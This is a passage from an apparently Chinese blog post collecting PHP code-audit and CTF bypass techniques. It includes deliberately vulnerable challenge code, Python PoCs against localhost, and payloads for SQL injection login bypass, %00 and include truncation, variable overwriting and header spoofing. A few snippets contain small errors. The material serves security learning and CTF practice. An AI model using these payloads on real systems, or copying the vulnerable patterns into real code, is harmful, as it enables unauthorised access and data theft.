        echo 'Do you know .swp file?';
    }
    }else{
        echo 'Do you know PHP?';
}
}
?>
```

poc:

```
import requests

url = "http://127.0.0.1/test.php";
data = {
    "greeting": "Merry Christmas"+"aaaaa"*10000000
}
res = requests.post(url=url, data=data,allow_redirects=False)
print(res.text)
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664210591824-00db5293-f384-4d9d-a2d9-615665f42f07.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664210591824-00db5293-f384-4d9d-a2d9-615665f42f07.png)
ps:以上对php7不生效

### 换行符

**.不会匹配换行符**

```
<?php
show_source(__FILE__);
header("content-type:text/html; charset=utf-8");
$json  = $_POST['x'];
if (preg_match('/^.*(flag).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
}else{
    $a = str_replace("\n","",$json);
    if (strpos($a,"flag")!=false){
        echo "flag{xxxxx}";
    }
}
```

这段代码的意思就是传入的值中不能被preg_match匹配到flag，但是又要存在flag才能获得flag。这里有个关键点，如何只传入\nflag是不行的，因为这样strpos会返回0，相当于false
poc:

```
import requests

url = "http://127.0.0.1/test.php";
data = {
    "x": "\naaflag"
}
res = requests.post(url=url, data=data,allow_redirects=False)
print(res.text)
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664212236037-404ab3ea-6564-4da3-a8a5-2b9bac5238ed.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664212236037-404ab3ea-6564-4da3-a8a5-2b9bac5238ed.png)
** 而在非多行模式下，$似乎会忽略在句尾的%0a**

```
if (preg_match('/^flag$/', $_GET['a']) && $_GET['a'] !== 'flag') {
    echo $flag;
}
```

?a=flag%0a

## 变量覆盖

### extract变量覆盖

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664372322802-2f037800-d395-497b-936c-9e5f3803a2f7.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664372322802-2f037800-d395-497b-936c-9e5f3803a2f7.png)
使用例子:

```
<?php
$a = "Original";
$my_array = array("a" => "Cat","b" => "Dog", "c" => "Horse");
extract($my_array);
echo "\$a = $a; \$b = $b; \$c = $c";
?>
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664372356449-4949468c-f9f2-4372-af01-87d214424592.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664372356449-4949468c-f9f2-4372-af01-87d214424592.png)
ctf题目:

```
<?php
highlight_file(__FILE__);
$flag = "E:\\phpstudy_pro\\WWW\\flag.txt";
extract($_GET);
if (isset($HY)){
    $content = trim(file_get_contents($flag));
    if ($HY == $content){
        echo file_get_contents("E:\\phpstudy_pro\\WWW\\flag.txt");
    }else{
        echo 'Oh,no';
    }
}
```

payload:

```
http://127.0.0.1/test.php?HY=&flag=  //传入HY和flag空值，
//extract接受了一个数组，分别赋值造成覆盖
```

问题:这里为什么不能给HY和flag分别传入1
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664381662252-e858b918-d47d-4ef3-9619-89d9622fa466.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664381662252-e858b918-d47d-4ef3-9619-89d9622fa466.png)
传入两个1后，$HY和$flag都为1，进入if语句，file_get_content(1)，返回为空，但是此时$HY=1，就不相等了，所以同理可以构造多种payload的

```
http://127.0.0.1/test.php?HY=&flag=aaa
```

### parse_str()

解析字符串并注册成变量

```
$b=1;
Parse_str('b=2');
Print_r($b);
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664383931472-7c2603eb-5da6-493d-961a-0cef9d6aed2c.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664383931472-7c2603eb-5da6-493d-961a-0cef9d6aed2c.png)

### import_request_variables()

将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。
在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。

```
//导入POST提交的变量值，前缀为post_
import_request_variable("p"， "post_");
//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST
import_request_variable("gp"， "gp_");
//导入Cookie和GET的变量值，Cookie变量值优先于GET
import_request_variable("cg"， "cg_");
```

### $$变量覆盖

提交参数chs，则可覆盖变量”$chs”的值。$key为chs时，$$key就变成$chs

```
<?  
$chs = '';  
if($_POST && $charset != 'utf-8'){  
    $chs = new Chinese('UTF-8', $charset);  
    foreach($_POST as $key => $value){  
        $$key = $chs->Convert($value);  
    }  
    unset($chs);  
} 
```

### register_globals全局变量覆盖

php.ini中有一项为register_globals，即注册全局变量，当register_globals=On时，传递过来的值会被直接的注册为全局变量直接使用，而register_globals=Off时，我们需要到特定的数组里去得到它。
注意：register_globals已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除

当register_global=ON时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等

```
<?php
echo "Register_globals: ".(int)ini_get("register_globals")."<br/>";

if ($auth){
   echo "private!";
}
?>
```

当register_globals=OFF时，这段代码不会出问题。
但是当register_globals=ON时，提交请求URL：http://www.a.com/test.php?auth=1,变量$auth将自动得到赋值。得到的结果为
Register_globals:1
private!
*小记：如果上面的代码中，已经对变量$auth赋了初始值，比如$auth=0，那么即使在URL中有/test.php?auth=1，也不会将变量覆盖，也就是说不会打印出private！*
利用：
通过$GLOBALS获取的变量，也可能导致变量覆盖。

```
<?php
echo "Register_globals:".(int)ini_get("register_globals")."<br/>";
if (ini_get('register_globals')) foreach($_REQUEST as $k=>$v) unset(${$k});
print $a;
print $_GET[b];
?>
```

变量$a未初始化，在register_globals=ON时，再尝试控制“$a”的值（http://www.a.com/test1.php?a=1&b=2），会因为这段代码而出错。
而当尝试注入“GLOBALS[a]”以覆盖全局变量时（http://www.a.com/test1.php?GLOBALS[a]=1&b=2），则可以成功控制变量“$a”的值。这是因为unset()默认只会销毁局部变量，要销毁全局变量必须使用$GLOBALS。
**而在register_globals=OFF时，则无法覆盖到全局变量。**
*小记：register_globals的意思是注册为全局变量，所以当On的时候，传递过来的值会被直接注册为全局变量而直接使用，当为OFF的时候，就需要到特定的数组中去得到它。unset用于释放给定的变量*

## is_numeric()绕过

[极客大挑战 2019]BuyFlag

```
if (is_numeric($password)) {
        echo "password can't be number</br>";
    }elseif ($password == 404) {
        echo "Password Right!</br>";
    }
```

密码是404，但是不能输入数字
可以借助url编码中的空字符，例如%00或者%20，其中%00加在数值前面或者后面都可以，也就是%00404或者404%00这样，将%20加在数值末尾也可以绕过，比如404%20。
payload:

```
数字->非数字：
404%00
404%20
404,
404'
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664439276748-c113f1e6-863f-4757-b928-fad0595e01cd.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664439276748-c113f1e6-863f-4757-b928-fad0595e01cd.png)

## 绕过过滤的空白字符

```
<?php
header("content-type:text/html; charset=utf-8");
highlight_file(__FILE__);
$info = "";
$req = [];
$flag="flag{this_is_flag}";

ini_set("display_error", false); //为一个配置选项设置值
error_reporting(0); //关闭所有PHP错误报告

if(!isset($_GET['number'])){
    header("hint:26966dc52e85af40f59b4fe73d8c323a.txt"); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt

    die("have a fun!!"); //die — 等同于 exit()

}

foreach([$_GET, $_POST] as $global_var) {  //foreach 语法结构提供了遍历数组的简单方式
    foreach($global_var as $key => $value) {
        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）
        is_string($value) && $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串
    }
}


function is_palindrome_number($number) {
    $number = strval($number); //strval — 获取变量的字符串值
    $i = 0;
    $j = strlen($number) - 1; //strlen — 获取字符串长度
    while($i < $j) {
        if($number[$i] !== $number[$j]) {
            return false;
        }
        $i++;
        $j--;
    }
    return true;
}


if(is_numeric($_REQUEST['number'])) //is_numeric — 检测变量是否为数字或数字字符串
{

    $info="sorry, you cann't input a number!";

}
elseif($req['number']!=strval(intval($req['number']))) //intval — 获取变量的整数值
{

    $info = "number must be equal to it's integer!! ";

}
else
{

    $value1 = intval($req["number"]);
    $value2 = intval(strrev($req["number"]));

    if($value1!=$value2){
        $info="no, this is not a palindrome number!";
    }
    else
    {

        if(is_palindrome_number($req["number"])){
            $info = "nice! {$value1} is a palindrome number!";
        }
        else
        {
            $info=$flag;
        }
    }

}

echo $info;
```

需要满足条件:
1.条件is_numeric($_REQUEST[‘number’])为假，这个绕过的方法很多使用%00开头也可以再POST一个number参数把GET中的覆盖掉也可以，所以这一步很简单。
2.要求 $req[‘number’]==strval(intval($req[‘number’]))
3.要求intval($req[‘number’]) == intval(strrev($req[‘number’]))
4.is_palindrome_number()返回False，这个条件只要在一个回文数比如191前面加一个字符即可实现
得到flag 看上述条件，条件4需要加字符但是加了之后需要满足2,3这两个条件所以就可以在原题目中简化出2,3,4来进行Fuzzing，简化后后端代码如下：

```
<?php
function is_palindrome_number($number) {
    $number = strval($number); //strval — 获取变量的字符串值
    $i = 0;
    $j = strlen($number) - 1; //strlen — 获取字符串长度
    while($i < $j) {
        if($number[$i] !== $number[$j]) {
            return false;
        }
        $i++;
        $j--;
    }
    return true;
}
$a = trim($_GET['number']);
if ((($a==strval(intval($a)))&(intval($a)==intval(strrev($a)))&!is_palindrome_number($a))==1):
    print "ok";
else:
    print "no";
endif;
```

poc:

```
import requests
for i in range(256):
    rq = requests.get("http://127.0.0.1/test3.php?number=%s191"%("%%%02X"%i))
    if 'ok' in rq.text:
        print ("%%%02X"%i)
```

%%%02X这里解释一下:
首先分开看 %% 和 %02X 两部分
%%第一个为转义的意思，所以这两个一起的意思就是 %
%02x ：%x是把数字输出为16进制的格式，%02x是保证输出至少占两个字符的位置,如果不够两位的话前面补0
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664527433234-991a8002-e11a-4eb8-b6db-ad7f98a1924f.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664527433234-991a8002-e11a-4eb8-b6db-ad7f98a1924f.png)
所以可知最终payload有:

```
%00%0C404
%0C404%00
%00%2B404
%2B404%00
%0C404%20
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664528429736-e234f081-4e74-4e7f-b76c-2717f2d36a86.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664528429736-e234f081-4e74-4e7f-b76c-2717f2d36a86.png)

## 多重加密

```
<?php
$login = unserialize(gzuncompress(base64_decode($requset['token'])));
if($login['user'] === 'ichunqiu'){echo $flag;}    
?>
```

本地:

```
<?php
$arr = array(['user'] === 'ichunqiu');
$token = base64_encode(gzcompress(serialize($arr)));
print_r($token);
// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=
?>
```

## SQL注入_WITH ROLLUP绕过

当遇到报错:
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664545321688-c300c5e7-4b73-4e82-abe0-07cc279954bc.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664545321688-c300c5e7-4b73-4e82-abe0-07cc279954bc.png)
MySQL 5.7.5以上版本，实现了对功能依赖的检测。如果启用了only_full_group_by SQL模式(默认启用)，那么MySQL就会拒绝执行 select list、HAVING condition或ORDER BY list引用既不在GROUP BY子句中被命名，也不在功能上依赖于GROUP BY列（由GROUP BY列唯一确定）的未聚合列的查询。
从MySQL5.7.5开始，默认的SQL模式包括only_full_group_by。（在5.7.5之前，MySQL没有检测到功能依赖项，only_full_group_by在默认情况下是不启用的。关于前5.7.5行为的描述，请参阅MySQL 5.6参考手册。)
解决方法(暂时):

```
SET sql_mode ='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION';
```

或者在my.ini中追加:

```
sql-mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION
```

题目:

```
<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
if (!isset($_POST['username']) || !isset($_POST['password'])) {
    echo '<form action="" method="post">'."<br/>";
    echo '<input name="username" type="text"/>'."<br/>";
    echo '<input name="password" type="text"/>'."<br/>";
    echo '<input type="submit" />'."<br/>";
    echo '</form>'."<br/>";
    echo '<!--source: source.txt-->'."<br/>";
    die;
}

function AttackFilter($StrKey,$StrValue,$ArrReq){
    if (is_array($StrValue)){

//检测变量是否是数组

        $StrValue=implode($StrValue);

//返回由数组元素组合成的字符串

    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){

//匹配成功一次后就会停止匹配

        print "水可载舟，亦可赛艇！";
        exit();
    }
}

$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){

//遍历数组

    AttackFilter($key,$value,$filter);
}

$con = mysql_connect("127.0.1.1:3306","root","root");
if (!$con){
    die('Could not connect: ' . mysql_error());
}
$db="test";
mysql_select_db($db, $con);

//设置活动的 MySQL 数据库

$sql="SELECT * FROM users WHERE username = '{$_POST['username']}'";
$query = mysql_query($sql);

//执行一条 MySQL 查询

if (mysql_num_rows($query) == 1) {

//返回结果集中行的数目

    $key = mysql_fetch_array($query);

//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false

    if($key['password'] == $_POST['password']) {
        print "CTF{You_ArE_sUUccesS!}";
    }else{
        print "亦可赛艇！";
    }
}else{
    print "一颗赛艇！";
    print $sql;
    print $query;
}
mysql_close($con);
?>
```

自己修改配置，连接上数据库.
关于WITH ROLLUP绕过我们来看一些例子
数据库基本信息:
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799167791-f73d8cad-de15-4ed1-b759-6e60ac3bdc7c.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664799167791-f73d8cad-de15-4ed1-b759-6e60ac3bdc7c.png)
使用with rollup语句( 分组后会在多一行统计 )
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799401626-0548b90c-ae44-4931-a58c-0e30f530b0c8.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664799401626-0548b90c-ae44-4931-a58c-0e30f530b0c8.png)
多了一行，id为空，我们搭配limit语句
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799686573-6baf3c8d-5153-405e-9a3f-8c8e34cd9159.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664799686573-6baf3c8d-5153-405e-9a3f-8c8e34cd9159.png)
那如果我们用password分组呢
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799734140-1e13868d-1733-49ef-a0dc-2cc6720027e7.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664799734140-1e13868d-1733-49ef-a0dc-2cc6720027e7.png)
现在的password为NULL,查询出的白居易是没密码的
但是这里的代码中 ,是被过滤的，那么我们可以搭配offset去查询
关于他们两个的用法:
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664800909937-c4f07ca9-ac72-453d-99a1-47596c230bf8.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664800909937-c4f07ca9-ac72-453d-99a1-47596c230bf8.png)
所以我们就可以构造语句:
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664800950046-ac038845-128e-47b6-b80b-2f11f8e05b7a.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664800950046-ac038845-128e-47b6-b80b-2f11f8e05b7a.png)
所以当我们知道用户名的时候，就可以构造sql语句进行绕过，此时password就为NULL
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664804646068-df9eb134-ecf7-4a47-8e40-15d1530d0d45.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664804646068-df9eb134-ecf7-4a47-8e40-15d1530d0d45.png)
构造payload:

```
username=白居易' GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1#&password=
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664805775369-dcc55dfe-2e38-405e-a694-f4dc4ac7eb03.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664805775369-dcc55dfe-2e38-405e-a694-f4dc4ac7eb03.png)

## ereg正则%00截断

代码:

```
<?php

highlight_file(__FILE__);
header("Content-Type:text/html;charset=utf-8");

$flag = "flag{this_Is_f1ag}";

if (isset ($_GET['password']))
{
    if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
    {
        echo '<p>You password must be alphanumeric</p>';
    }
    else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
    {
        if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置
        {
            die('Flag: ' . $flag);
        }
        else
        {
            echo('<p>*-* have not been found</p>');
        }
    }
    else
    {
        echo '<p>Invalid password</p>';
    }
}
?>
```

ereg函数:
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664806850256-c730b620-320c-4e26-8ba7-0bdecd4986a4.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664806850256-c730b620-320c-4e26-8ba7-0bdecd4986a4.png)
如果有找到模式匹配，则返回true，否则返回false
我们可以使用科学计数法绕过前面
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807270813-9dd92824-beab-45ce-8c55-12346bc1ab1d.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664807270813-9dd92824-beab-45ce-8c55-12346bc1ab1d.png)
但是它又必须要包含”*-*“,而ereg已经限制了只能为数字和字母
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807305892-33983499-9772-425b-8e27-72a1dcd8b805.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664807305892-33983499-9772-425b-8e27-72a1dcd8b805.png)
我们可以绕过ereg的检测:
**方法一 %00截断：**
**payload:**

```
?password=1e9%00*-*
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807530741-53ab0d03-0526-478a-9349-800daeade8ec.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664807530741-53ab0d03-0526-478a-9349-800daeade8ec.png)
**方法二 把password通过数组的形式去传参:**
payload:

```
?password[]=1e9&password[]=*-*
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807600826-04801088-c556-44c1-be20-66816ad150da.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664807600826-04801088-c556-44c1-be20-66816ad150da.png)

## session绕过

```
<?php

highlight_file(__FILE__);
header("Content-Type:text/html;charset=utf-8");

$flag = "flag{this_Is_f1ag}";

session_start(); 
if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag: '.$flag);
    else
        print '<p>Wrong guess.</p>';
}
mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
?>
```

访问页面，发现生成了session
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664808328606-a0f73da1-0a50-4a70-97d4-8d71736bb854.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664808328606-a0f73da1-0a50-4a70-97d4-8d71736bb854.png)
清除session，然后给password传入空值即可
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664808375010-3ec57ea9-72da-4371-8819-1f5e688a8661.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664808375010-3ec57ea9-72da-4371-8819-1f5e688a8661.png)

## 密码md5比较绕过

```
<?php
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
//配置数据库
if($_POST['username'] && $_POST['password']) {
    $conn = mysql_connect("127.0.0.1:3306", "root", "root");
    mysql_select_db("test") or die("Could not select database");
    if ($conn->connect_error) {
        die("Connection failed: " . mysql_error($conn));
} 
$user = $_POST['username'];
$pass = md5($_POST['password']);

$sql = "select password from users where username='$user'";
//print $sql;
$query = mysql_query($sql);
if (!$query) {
    printf("Error: %s\n", mysql_error($conn));
    exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
if (($row['password']) && (!strcasecmp($pass, $row['password']))) {
//如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。

    echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");

}
}
?>
```

只要让row[pw]的值与pass经过md5之后的值相等即可 而$pass经过md5之后的值是我们可以通过正常输入控制的
同时，row[pw]的值是从$sql提取出来的
目标就一句话：只要我们能够修改$sql的值，此题解决。
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664814374666-ee8ceab2-378c-40af-ac86-de012e0bdba0.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664814374666-ee8ceab2-378c-40af-ac86-de012e0bdba0.png)
此时password的值是由我们控制的
构造payload:

```
username=白居易' and 0=1 union select "e10adc3949ba59abbe56e057f20f883e"#&password=123456
```

e10adc3949ba59abbe56e057f20f883e是123456的md5值
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664815167929-5280d428-308b-483d-a2bf-c6edde20d437.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664815167929-5280d428-308b-483d-a2bf-c6edde20d437.png)

## url二次编码绕过

```
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
```

二次编码

```
http://127.0.0.1/test.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664815455801-b927b743-9aff-4b31-9f70-0b9ff86d7c2b.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664815455801-b927b743-9aff-4b31-9f70-0b9ff86d7c2b.png)

## sql闭合绕过

```
<?php


if($_POST[user] && $_POST[pass]) {
    $conn = mysql_connect("*******", "****", "****");
    mysql_select_db("****") or die("Could not select database");
    if ($conn->connect_error) {
        die("Connection failed: " . mysql_error($conn));
} 
$user = $_POST[user];
$pass = md5($_POST[pass]);

//select user from php where (user='admin')#

//exp:admin')#

$sql = "select user from php where (user='$user') and (pw='$pass')";
$query = mysql_query($sql);
if (!$query) {
    printf("Error: %s\n", mysql_error($conn));
    exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];
  if($row['user']=="admin") {
    echo "<p>Logged in! Key: *********** </p>";
  }

  if($row['user'] != "admin") {
    echo("<p>You are not admin!</p>");
  }
}

?>
```

这个很简单

```
admin')#
```

## x-forwarded-for绕过

```
<?php
function GetIP(){
if(!empty($_SERVER["HTTP_CLIENT_IP"]))
    $cip = $_SERVER["HTTP_CLIENT_IP"];
else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
    $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if(!empty($_SERVER["REMOTE_ADDR"]))
    $cip = $_SERVER["REMOTE_ADDR"];
else
    $cip = "0.0.0.0";
return $cip;
}

$GetIPs = GetIP();
if ($GetIPs=="1.1.1.1"){
echo "Great! Key is *********";
}
else{
echo "错误！你的IP不在访问列表之内！";
}
?>
```

HTTP头添加X-Forwarded-For:1.1.1.1

## intval函数四舍五入

```
<?php
if($_GET[id]) {
mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
mysql_select_db(SAE_MYSQL_DB);
$id = intval($_GET[id]); ## 这里过滤只有一个intval
$query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
if ($_GET[id]==1024) {
    echo "<p>no! try again</p>";
    }
  else{
    echo($query[content]);
  }
}
```

payload:

```
?a=1024.1
```

## 浮点数精度忽略

intval 函数最大的值取决于操作系统:
Copy32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。 64 位系统上，最大带符号的 integer 值是 9223372036854775807。

```
if ($req["number"] != intval($req["number"]))
```

在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。 输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等

## 常见截断

### iconv 异常字符截断

iconv遇到不能识别的内容，会从第一个不能识别的字符开始截断，并生成一个E_NOTICE
fuzz一下

```
<?php
$a ="1.php";
$b =".jpg";
for($i=0; $i<300; $i++){
    $c = $a.chr($i).$b;
    $d = iconv("UTF-8","gb2312", $c);
    echo "$i ==> ".$d."n";
    echo "\n";
}
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664851197425-c4dff480-15bc-42b3-b967-1517498a0c2c.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664851197425-c4dff480-15bc-42b3-b967-1517498a0c2c.png)

经过测试， chr(128)到chr(255)都可以截断 ，按理说是截断成1.php，可能环境有点问题吧！

### eregi、ereg可用%00截断

功能：正则匹配过滤 条件：要求php<5.3.4 魔术引号关闭
详见上文

### move_uploaded_file 用\0截断

5.4.x<= 5.4.39, 5.5.x<= 5.5.23, 5.6.x <= 5.6.7 原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生 cve： https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348
move_uploaded_file($_FILES[‘x’][‘tmp_name’],”/tmp/test.php\x00.jpg”)
上传抓包修改name为a.php\0jpg（\0是nul字符），可以看到$_FILES[‘xx’][‘name’]存储的字符串是a.php，不会包含\0截断之后的字符，因此并不影响代码的验证逻辑。
但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。

### inclue用?和#截断

```
<?php
$name=$_GET['name'];  
$filename=$name.'.php';  
include $filename;  
?>
```

当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。
**如果能够包含远程文件**时，可以使用?和%23进行伪截断，**该方法对PHP版本没要求**，**但是要求能够包含远程文件,即**allow_url_include=On
?原理是把后面的值看成参数，例如http://172.17.0.3/1.php?.html
\#原理就是前面说的#被include认为是锚点，例如http://172.17.0.3/1.txt#.html，#后面的被认为是锚点(使用url编码后的#---%3E%23)
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664852581232-32255fa9-6d2d-4002-8c63-d223c952a637.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664852581232-32255fa9-6d2d-4002-8c63-d223c952a637.png)
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664852618885-b65805ad-8a9f-4963-870e-bdd63b34158f.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664852618885-b65805ad-8a9f-4963-870e-bdd63b34158f.png)

